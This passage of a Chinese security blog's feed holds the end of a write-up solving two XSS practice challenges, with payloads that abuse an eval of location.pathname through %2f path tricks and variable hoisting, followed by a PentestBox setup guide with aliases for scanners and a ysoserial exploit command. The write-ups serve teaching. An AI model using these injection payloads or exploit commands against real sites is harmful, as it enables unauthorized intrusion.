class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>知识点：</p><ul><li>使用%2f让浏览器不会吞掉多余路径</li></ul><p>eval执行<code>location.pathname</code>，直接输出看下location的内容：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// http://px1624.sinaapp.com/test/xsstest11/</span></span><br><span class="line">location.pathname</span><br><span class="line"><span class="comment">// /test/xsstest11/</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">"/test/xsstest11/"</span>)</span><br><span class="line"><span class="comment">// 报错Invalid regular expression flags 正则表达式语法无效</span></span><br></pre></td></tr></table></figure><p>JS语法把里头的路径当作JS解析了，由于<code>/</code>开头，被当作正则表示式。在构造payload时，我们就需要同时考虑JS语法正确跟URL路径正确。</p><p>根据前面几题的经验，这边就可以处理成<strong>一个正则表达式的表达式运算</strong>，添加一个<code>/</code>，然后再路由回来：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// http://px1624.sinaapp.com/test//xsstest11/alert(1)/../</span></span><br><span class="line">/test<span class="comment">//xsstest11/alert(1)/../</span></span><br><span class="line">一个正则表达式，除以xsstest11这个变量,除以alert方法，然后由于多了一个alert路径，添加../路由回来</span><br></pre></td></tr></table></figure><p>但看这个思路的话会存在一个<strong>变量问题</strong>(xsstest11未赋值)，然后拉去浏览器一访问，会发现另一个更严重的问题：我们写入的<code>alert(1)/../</code>没了。</p><p>再抓包看，会发现我们的<code>alert(1)/../</code>直接被浏览器吃了，压根没出现在数据包里。我们首先要解决之后的payload不会被浏览器吃的问题，不然我们根本没法往后加东西。</p><h3 id="2f突破浏览器作妖"><a href="#2f突破浏览器作妖" class="headerlink" title="%2f突破浏览器作妖"></a>%2f突破浏览器作妖</h3><p>根据浏览器不URL解码的特性，只需要把<code>/</code>编码成<code>%2f</code>即可绕过（第一次做的时候，直接这个地方就趴下死了）</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuifz3bhmj311p0ksdhi.jpg" alt="11-1.png"></p><p>然后根据报错慢慢修改，这里<code>..%2f</code>语法报错了，注释掉，再修改payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://px1624.sinaapp.com/test//xsstest11/alert(1)//..%2f..%2f</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gkvrdwa1rsj31l509p74y.jpg" alt="12-2.png"></p><p>来到了变量没定义这一关，看似死局，因为我们没法修改前面的路由</p><p>…………?</p><p>好像完全可以修改前面的路由，然后注释后面的全部代码，利用<code>..%2f</code>再构造正常路由就可以了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://px1624.sinaapp.com/1/;alert(11)//test/xsstest11/..%2f..%2f..%2f..%2f..%2f/test/xsstest11/</span><br></pre></td></tr></table></figure><p>一个理应正确的payload，但是却返回400，经过测试，发现只要我们企图<code>../</code>到根目录就会报错，那么只需要把test提前到前面就可以了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://px1624.sinaapp.com/test/;alert(11)//test/xsstest11/..%2f..%2f..%2f..%2f/xsstest11/</span><br></pre></td></tr></table></figure><p>再精简下，payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://px1624.sinaapp.com/test/;alert(11)//..%2f..%2f/xsstest11/</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuig70vnsj31h60bxgm5.jpg" alt="11-success.png"></p><p>然后px1642大哥又帮我精简了一个%2f…..复制粘贴毁一生</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://px1624.sinaapp.com/test/;alert(11)//..%2f../xsstest11/</span><br></pre></td></tr></table></figure><h2 id="第十二题"><a href="#第十二题" class="headerlink" title="第十二题"></a>第十二题</h2><p>题目：<a href="http://px1624.sinaapp.com/test/xsstest12/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest12/</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>alert(12) to win<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span>(<span class="regexp">/\/xsstest12\//</span>.test(location.pathname.substr(<span class="number">0</span>,<span class="number">17</span>)))&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">eval</span>(location.pathname)</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>知识点：</p><ul><li>JS语言声明变量时变量提升的特性</li><li>var的另一种赋值方式</li></ul><p>新增了一个正则，要求我们的路由前17位必须包含<code>/xsstest12/</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// http://px1624.sinaapp.com/test/xsstest12/</span></span><br><span class="line"></span><br><span class="line">location.pathname</span><br><span class="line"><span class="string">"/test/xsstest12/"</span></span><br><span class="line">location.pathname.length</span><br><span class="line"><span class="number">16</span></span><br></pre></td></tr></table></figure><p>原本路由是16字节，现在要求17个字节，明显是让我们加入一个<code>/</code>来满足JS语法正确</p><p>相当于又回到了十一题的我们一开始讨论的情况，就是前面不允许我们加东西，只允许在后面填充，并且要求满足JS语法。</p><p>回到了解决<strong>xsstest12变量不存在</strong>的问题</p><h3 id="变量提升特性"><a href="#变量提升特性" class="headerlink" title="变量提升特性"></a>变量提升特性</h3><p>通常而言我们知道，一个变量应该先声明，后使用，比如python：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuigcebguj313a0fzjsm.jpg" alt="11-0.png"></p><p>而JS却不是，参考<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Grammar_and_types#%E5%A3%B0%E6%98%8E" target="_blank" rel="noopener">说明</a>：</p><blockquote><p>JavaScript 变量的另一个不同寻常的地方是，你可以先使用变量稍后再声明变量而不会引发异常。这一概念称为变量提升；JavaScript 变量感觉上是被“提升”或移到了函数或语句的最前面。但是，提升后的变量将返回 undefined 值。因此在使用或引用某个变量之后进行声明和初始化操作，这个被提升的变量仍将返回 undefined 值。</p></blockquote><p>那么实际上只需要在后面继续声明变量就可以了：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/test<span class="comment">//xsstest11/alert(23);var xsstest11=1;//..%2f..%2f..%2f..%2f</span></span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuigi2w9aj31kd0dvmyc.jpg" alt="12-1.png"></p><p>但是<code>var xsstest12</code>这个地方的空格在URL中会被编码成%20，然后传入JS中。JS是无法解析的。</p><p><strong>JS中替代空格</strong>，换一下变成注释符<code>/**/</code>，然后补齐路由即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://px1624.sinaapp.com/test//xsstest12/alert(23);var/**/xsstest12=1;//..%2f..%2f..%2f..%2f</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuigolcooj31l509p74y.jpg" alt="12-2.png"></p><h3 id="企图简短payload"><a href="#企图简短payload" class="headerlink" title="企图简短payload"></a>企图简短payload</h3><p>当然我们还可以进一步精简payload，比如不注释，而是后面这部分也利用起来变成正则表达式变量进行赋值：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// http://px1624.sinaapp.com/test//xsstest12/alert(23);var/**/xsstest12=/..%2f..%2f..%2f/</span></span><br><span class="line">location.pathname.length</span><br><span class="line"><span class="number">68</span></span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuigsgze5j31gb0acgm8.jpg" alt="12-3.png"></p><p>进一步简短，就要从赋值入手了。</p><h4 id="var-a-1-解构赋值"><a href="#var-a-1-解构赋值" class="headerlink" title="var[a]=[1] 解构赋值"></a>var[a]=[1] 解构赋值</h4><p>非常神奇的赋值方式：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuigwj9k1j30ip0b4wem.jpg" alt="12-4.png"></p><p>尝试过在各个网站领域 去搜索这种赋值方式，但是没有收获，决定厚着脸皮去问下原题作者：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuiha9qhij30xp0s6ae5.jpg" alt="12-1-0.png"></p><p>emmm…..</p><p>又跟px1642老哥交流了下QAQ，发现官方也有这种赋值方式的说明，叫做<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Destructuring_assignment" target="_blank" rel="noopener">解构赋值</a>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//数组</span></span><br><span class="line"><span class="keyword">var</span> a, b, rest;</span><br><span class="line">[a, b] = [<span class="number">10</span>, <span class="number">20</span>];</span><br><span class="line"><span class="built_in">console</span>.log(a); <span class="comment">// 10</span></span><br><span class="line"><span class="built_in">console</span>.log(b); <span class="comment">// 20</span></span><br><span class="line"><span class="comment">//对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//甚至可以省略var</span></span><br><span class="line">(&#123; c, d &#125; = &#123; <span class="attr">c</span>: <span class="number">10</span>, <span class="attr">d</span>: <span class="number">20</span> &#125;);</span><br><span class="line"><span class="built_in">console</span>.log(c); <span class="comment">// 10</span></span><br><span class="line"><span class="built_in">console</span>.log(d); <span class="comment">// 20</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//然后我们省略这个空格,就形成了</span></span><br><span class="line"><span class="keyword">var</span>[a,b]=[<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line"><span class="comment">//命令行中可以这么无var赋值，但是测试无法正常变量提升</span></span><br><span class="line">([c,d]=[<span class="number">3</span>,<span class="number">4</span>])</span><br><span class="line">(&#123;e,f&#125;=&#123;<span class="attr">e</span>:<span class="number">5</span>,<span class="attr">f</span>:<span class="number">6</span>&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// http://px1624.sinaapp.com/test//xsstest12/alert(23);var[xsstest12]=[]//..%2f..%2f/</span></span><br><span class="line"></span><br><span class="line">location.pathname</span><br><span class="line"><span class="string">"/test//xsstest12/alert(23);var[xsstest12]=[]//..%2f..%2f/"</span></span><br><span class="line">location.pathname.length</span><br><span class="line"><span class="number">57</span></span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuih3retqj31h309kgm7.jpg" alt="12-5.png"></p><p>进一步缩短，虽然会运行报错，但是不影响</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// http://px1624.sinaapp.com/test//xsstest12/alert(23);var[xsstest12]=/..%2f/</span></span><br><span class="line"></span><br><span class="line">location.pathname</span><br><span class="line"><span class="string">"/test//xsstest12/alert(23);var[xsstest12]=/..%2f/"</span></span><br><span class="line">location.pathname.length</span><br><span class="line"><span class="number">49</span></span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuihgz8klj31hv09ejry.jpg" alt="12-6.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s/MNP1PW0bi0aL7dRr1aa2Tg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/MNP1PW0bi0aL7dRr1aa2Tg</a><br><a href="https://mp.weixin.qq.com/s/T44dQckTjc0M1loRzTRH0A" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/T44dQckTjc0M1loRzTRH0A</a><br><a href="https://mp.weixin.qq.com/s/jx-UWFfSPOVPhWLsvGxPcw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/jx-UWFfSPOVPhWLsvGxPcw</a><br><a href="https://mp.weixin.qq.com/s/Q976z2ryfkEJQiSyl8aH8g" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Q976z2ryfkEJQiSyl8aH8g</a><br><a href="https://mp.weixin.qq.com/s/Nxjn_SUAfrB-K5z6YdlW8g" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Nxjn_SUAfrB-K5z6YdlW8g</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;前段时间看到了px1624的10题XSS案例，一直留着留着，终于拿出来看看了。还好网站没关。（然后突然增加了2题变成了12题了）&lt;/p&gt;
&lt;
      
    
    </summary>
    
    
      <category term="web,XSS" scheme="http://lalajun.com/tags/web-XSS/"/>
    
  </entry>
  
  <entry>
    <title>windows下打造顺手的搬砖环境-PentestBox</title>
    <link href="http://lalajun.com/2020/06/28/windows%E4%B8%8B%E6%89%93%E9%80%A0%E9%A1%BA%E6%89%8B%E7%9A%84%E6%90%AC%E7%A0%96%E7%8E%AF%E5%A2%83%E2%80%94PentestBox/"/>
    <id>http://lalajun.com/2020/06/28/windows下打造顺手的搬砖环境—PentestBox/</id>
    <published>2020-06-28T14:58:33.000Z</published>
    <updated>2020-08-25T02:11:00.890Z</updated>
    
    <content type="html"><![CDATA[<p>字数：2k</p><p>推荐阅读时间：5min</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>这是一篇给使用windows，但是找不到一个很好的渗透环境的萌新的文章。</p></blockquote><p>其实在刚开始工作的时候，用windows系统干活总是觉得很麻烦，尤其是工具很多的情况下，比如用sqlmap，或者一些python脚本，用的大多是git的bash，但是它真的很丑，或者是cmd，复制粘贴不方便并且命令都是特有的，而powershell…..默认界面….真的有点丑。</p><p>一开始又经常是kali、windows双开的，但是我们通常又只需要用到kali的一两个小工具，同时两个系统目录文件不通总是有着各种各样的麻烦。每天都因此浪费大量的时间。</p><p>偷懒、觉得麻烦是解决问题的第一生产力。于是就想着能不能在 windows下有一个集成的、命令行的、用的是linux命令的、用的舒服的、长得好看的命令行。</p><p>于是——<strong>PentestBox</strong></p><h2 id="PentestBox"><a href="#PentestBox" class="headerlink" title="PentestBox"></a>PentestBox</h2><p>刚开始是yp老哥推荐的，一开始觉得也就还行吧马马虎虎，同时国内确实没有多少有关pentestBox的教程，有也就一笔带过，其实在使用的时候有很多的坑，有很多不去注意不会发现的好用功能，在自己摸索了一些也算是上手了之后，写出来分享给大家。</p><p>PentestBox，可以从<a href="https://pentestbox.org/" target="_blank" rel="noopener">官网</a>中下载，毫无疑问装有MSF的版本，官网描述了它很多优点，这边就再补充他让我觉得最爽的一点：</p><ol><li>可以很方便的自定义命令，越用越爽</li></ol><p>我们在最后再详细解释，先来讲讲安装和一些环境问题的坑。</p><h2 id="PentestBox安装与配置"><a href="#PentestBox安装与配置" class="headerlink" title="PentestBox安装与配置"></a>PentestBox安装与配置</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>PentestBox默认安装是在C盘，理所当然安装乖乖地在C盘会为我们减少很多意料之外的麻烦，但是搞IT的一般都没法忍受东西被安装在C盘。</p><p>那么先来说说如果逆天改命，想要安装在D盘会遇上的一些坑点：</p><h4 id="path与系统path不共享，导致系统命令无法找到"><a href="#path与系统path不共享，导致系统命令无法找到" class="headerlink" title="path与系统path不共享，导致系统命令无法找到"></a>path与系统path不共享，导致系统命令无法找到</h4><p>可能是自己把pentestbox移动到了D盘的原因，pentestbox中的path不与系统中的path共享<br>可以通过修改配置文件手动添加path</p><ol><li>找到PentestBox\config\init.bat</li><li>搜索path，在后面添加上系统path全部路径</li><li>保存，重启pentestbox</li></ol><p>这样，docker什么命令就都可以用了。<br>但是目前是静态配置，再修改windows path路径还要回来再改一下，不清楚如何动态配置，但也算是有用了呢</p><h4 id="另一个坑-bundler"><a href="#另一个坑-bundler" class="headerlink" title="另一个坑 bundler"></a>另一个坑 bundler</h4><p>如果我们要在pentextbox中使用到ruby。如果安装在D盘下，ruby的一些包会没有用，比如bundler<br>需要在目录<code>base ruby bin</code>下修改对应的bundler.bat里面的C盘至D盘就可以了。</p><h3 id="其他配置"><a href="#其他配置" class="headerlink" title="其他配置"></a>其他配置</h3><p>安装完不同的系统会遇上一些不同的问题：比如最头疼的就是命令行无法显示中文。</p><h4 id="命令行无法显示中文"><a href="#命令行无法显示中文" class="headerlink" title="命令行无法显示中文"></a>命令行无法显示中文</h4><p>PentestBox使用的是ConEmu命令行。</p><p>ConEmu命令行ls无法显示中文，解决：</p><ol><li>打开settings面板，找到<code>Startup -&gt; Envrioment</code>选项</li><li>在下面的文本框里添加一行：set LANG=zh_CN.UTF-8</li></ol><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg8eapd3m3j30zd0oy768.jpg" alt="中文.png"></p><p>参考：<a href="https://blog.csdn.net/DpangD/article/details/79254951" target="_blank" rel="noopener">https://blog.csdn.net/DpangD/article/details/79254951</a></p><h3 id="命令行文字重叠"><a href="#命令行文字重叠" class="headerlink" title="命令行文字重叠"></a>命令行文字重叠</h3><p>关闭Monospace然后重启。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg8eaxfxojj30z60otjtl.jpg" alt="重叠.png"></p><h3 id="命令补齐"><a href="#命令补齐" class="headerlink" title="命令补齐"></a>命令补齐</h3><p><strong>非常重要的命令补齐</strong>，PentestBox不自带这个功能，我们使用ConEmu里面的Clink作为命令补齐</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg8eb3uaw8j30z50pbac6.jpg" alt="PentestBox补齐.png"></p><p>如果报错了，只要根据提示去<code>http://mridgers.github.oi/clink/</code>下载<code>clink</code>,然后解压到<br><code>D:\PentestBox\vendor\conemu-maximus5\ConEmu\clink</code>路径下，再次启动就不会报错了。</p><p>参考：<a href="http://gv7.me/articles/2018/pentestbox-search-tools/，选择了其中我觉得最方便的一种补齐方式，也觉得够用了。" target="_blank" rel="noopener">http://gv7.me/articles/2018/pentestbox-search-tools/，选择了其中我觉得最方便的一种补齐方式，也觉得够用了。</a></p><h2 id="Pentestbox使用"><a href="#Pentestbox使用" class="headerlink" title="Pentestbox使用"></a>Pentestbox使用</h2><p>安装配置完成后，打开就是一个好看的命令行了，已经内置一些常用的工具，</p><ol><li><p>比如sqlmap，nc，nmap、msfconsole、dnsrecon、dirsearch等等，直接敲命令就可以使用。想不到命令也可以使用tab补齐。</p><p>同时，我们可以使用<code>list</code>命令可以查看环境中默认安装好的工具。</p></li><li><p>复制粘贴：选中文字即是复制，左键即粘贴，非常方便</p></li><li><p><code>e.</code>命令打开当前目录的资源管理器，可以快速打开windows目录进行操作</p></li><li><p><code>sh</code> 、<code>bash</code>命令会打开linux命令行，这个命令行界面就会跟linux一毛一样。</p></li><li><p>pentestbox会使用自己的独立的java、python环境。但是有时候会觉得几个环境会弄混。<br>个人在配置好windows path环境下，默认直接可以用<code>py -2</code>、<code>py -3</code>调用windows下的python；<br>用<code>python2</code>、<code>python3</code>调用pentestbox里的python</p></li></ol><h3 id="Pentestbox软件管理"><a href="#Pentestbox软件管理" class="headerlink" title="Pentestbox软件管理"></a>Pentestbox软件管理</h3><p>其中自带一个<code>toolsmanager</code>命令是可以进行一些默认工具的管理、添加、删除、更新。</p><p>比如下载whatweb、xsssniper、wafw00f等，安装、更新都有说明信息，就不赘述了。</p><h2 id="Pentestbox-aliases优化"><a href="#Pentestbox-aliases优化" class="headerlink" title="Pentestbox aliases优化"></a>Pentestbox aliases优化</h2><p>下面进入正题，在<code>&quot;D:\PentestBox\config\aliases&quot;</code>这个文件中保存着一些命令缩写的配置文件。</p><p>我们可以根据自己的使用习惯进行相应的配置，因为我们可能经常会需要来修改添加这个aliases文件。</p><p>第一步先把打开这个aliases配置文件设置为<code>config</code>命令，我们使用<code>vs code</code>作为编辑器来打开</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config=<span class="string">"D:\VS Code\bin\code.cmd"</span> <span class="string">"D:\PentestBox\config\aliases"</span></span><br></pre></td></tr></table></figure><p>再手动把编辑器配置成命令吧</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vscode=<span class="string">"D:\VS Code\bin\code.cmd"</span> $*</span><br><span class="line">ty= D:\Typora\Typora.exe $*</span><br></pre></td></tr></table></figure><blockquote><p>其中$*为外部输入参数</p></blockquote><p>这样<code>vscode &lt;文件名&gt;</code>就可以直接用编辑器打开</p><p>由于pentestbox中默认<code>cd</code>命令在windows环境下需要cd后，再手动换盘符。很麻烦。我们来自定义下<code>cd</code>完成直接跳转盘符。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span>= <span class="built_in">cd</span> /d $*</span><br></pre></td></tr></table></figure><p>还可以把经常要去的目录写成命令，比如去日常搬砖工具目录：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bzgj=cd /d <span class="string">"F:/BanZ"</span></span><br></pre></td></tr></table></figure><h3 id="自定义工具-命令"><a href="#自定义工具-命令" class="headerlink" title="自定义工具/命令"></a>自定义工具/命令</h3><p>除了一些以上这些基础的优化。aliases文件还可以帮助我们不用再敲这些很长的命令。</p><p>比如在目录爆破的时候经常要换自定义字典，但是字典又要使用绝对路径，命令就变得很复杂，经常用到，但是用了忘，忘了找，找了敲，敲了忘，很浪费时间。这时候我们就可以在alases文件里面来构造<code>dirsearch-x</code>命令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dirsearch-2=python3 <span class="string">"%pentestbox_ROOT%\bin\WebApplications\dirsearch\dirsearch.py"</span> -w D:\PentestBox\bin\WebApplications\dirsearch\db\top10000.txt $*</span><br><span class="line">dirsearch-3=python3 <span class="string">"%pentestbox_ROOT%\bin\WebApplications\dirsearch\dirsearch.py"</span> -w D:\PentestBox\bin\WebApplications\dirsearch\db\raft-large-directories.txt $*</span><br></pre></td></tr></table></figure><p>使用时只需要和dirsearch一样敲<code>dirsearch-2 -u xxx -e jsp</code>就可以默认换更全的字典进行爆破，而不用记这些不常用的命令。</p><p>除此之外，一些经常需要用的命令行工具，比如xray，每次都要切换目录，再：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --html-output .\output\123.html</span><br></pre></td></tr></table></figure><p>很麻烦，直接写入命令到aliases：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray-listen=<span class="built_in">cd</span> /d E:\xray &amp;&amp; xray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --html-output .\output\$*.html -new_console</span><br></pre></td></tr></table></figure><blockquote><p>-new_console为自动打开新窗口，就不用手动来 方便点</p></blockquote><p>这时候只要指定一下文件名，即：<code>xray-listen 文件名</code>就可以直接运行起来。</p><p>再快速切换到xray结果目录：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray-result=<span class="built_in">cd</span> /d <span class="string">"E:\xray\output"</span></span><br></pre></td></tr></table></figure><p>再比如命令很长的爬虫工具crawlergo，一样：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crawlergo=<span class="built_in">cd</span> /d E:\xray\crawlergo &amp;&amp; ./crawlergo.exe -c <span class="string">"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"</span> -t 20 -f smart --fuzz-path --robots-path --output-mode console --push-to-proxy http://127.0.0.1:7777/ $* -new_console</span><br></pre></td></tr></table></figure><p>还有ysoserial的exploit模块：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ysoserial-exploit= java -cp F:\BanZ\java\ysoserial.jar ysoserial.exploit.$*</span><br></pre></td></tr></table></figure><p>使用exploit模块就只需要</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ysoserial-exploit JRMPListener 1199 CommonsCollections5 <span class="string">"calc"</span></span><br></pre></td></tr></table></figure><p>就好了，但是还是觉得太长仍然可以继续修改aliases，直到你觉得舒服。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>每天找命令敲命令10分钟，再又忘记又找又敲，再又敲错又找又敲；</p><p>或者一个记事本里记一大堆命令，每次都打开，复制粘贴再改改改的日子。</p><p>你可以跟它说再见啦。</p><p>当然如果你还有让windows下的搬砖变得更加效率的办法，也欢迎跟我交流~</p><h2 id="0731更新-java图形化工具过小"><a href="#0731更新-java图形化工具过小" class="headerlink" title="0731更新-java图形化工具过小"></a>0731更新-java图形化工具过小</h2><p>在使用图形化java工具的时候遇到一个问题，就是编写alias命令</p><p><code>fofa=java -jar &quot;F:\BanZ\ForPentestBox\Fofa-collect\Fofa-collect.jar&quot;</code></p><p>在命令行运行<code>fofa</code>的时候，虽然能够正常打开但是打开的图形化界面不会根据当前电脑的分辨率来放大，导致字体很小</p><p>实际上这个问题是因为java使用的是环境中的java，而不是电脑中的安装java所导致的，当然具体底层原理就不细究了。</p><p><code>fofa=&quot;D:\Java\jdk1.8.0_241\jre\bin\java.exe&quot; -jar &quot;F:\BanZ\ForPentestBox\Fofa-collect\Fofa-collect.jar&quot;</code></p><p>这样改一下JAVA的路径就可以了。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/DpangD/article/details/79254951" target="_blank" rel="noopener">https://blog.csdn.net/DpangD/article/details/79254951</a></p><p><a href="http://gv7.me/articles/2018/pentestbox-search-tools/" target="_blank" rel="noopener">http://gv7.me/articles/2018/pentestbox-search-tools/</a></p><p>膜拜高中生：<a href="https://0chen.live/2017/08/31/%E6%AF%94PentestBox%E5%B1%8C%E7%9C%8B%E6%88%91%E5%A6%82%E4%BD%95%E6%89%93%E9%80%A0%E9%AB%98%E6%95%88%E7%8E%87%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E4%BB%A5%E5%8F%8A%E5%85%B6%E4%BB%96%E4%BC%98%E5%8C%96/" target="_blank" rel="noopener">https://0chen.live/2017/08/31/%E6%AF%94PentestBox%E5%B1%8C%E7%9C%8B%E6%88%91%E5%A6%82%E4%BD%95%E6%89%93%E9%80%A0%E9%AB%98%E6%95%88%E7%8E%87%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E4%BB%A5%E5%8F%8A%E5%85%B6%E4%BB%96%E4%BC%98%E5%8C%96/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;字数：2k&lt;/p&gt;
&lt;p&gt;推荐阅读时间：5min&lt;/p&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;这是一篇给使用windows，但是找不到一个很好的
      
    
    </summary>
    
    
      <category term="windows" scheme="http://lalajun.com/tags/windows/"/>
    
      <category term="渗透测试" scheme="http://lalajun.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="PentestBox" scheme="http://lalajun.com/tags/PentestBox/"/>
    
  </entry>
  
  <entry>
    <title>RMI-反序列化-深入-下</title>
